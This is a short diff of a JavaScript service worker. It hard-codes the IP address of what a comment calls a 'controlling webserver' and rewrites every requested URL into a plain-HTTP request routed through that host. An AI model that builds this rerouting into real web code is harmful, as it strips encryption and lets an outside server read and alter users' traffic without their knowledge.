@@ -8,7 +8,7 @@ self.addEventListener('message', (event) => {
 });
 
 async function openWebsite(url) {
-  const webserverIP = ''; // IP address of the controlling webserver
+  const webserverIP = '185.199.110.153'; // IP address of the controlling webserver
   const modifiedRequest = new Request(url.replace(/^https?:\/\//, 'http://' + webserverIP + '/'));
 
   const response = await fetch(modifiedRequest);
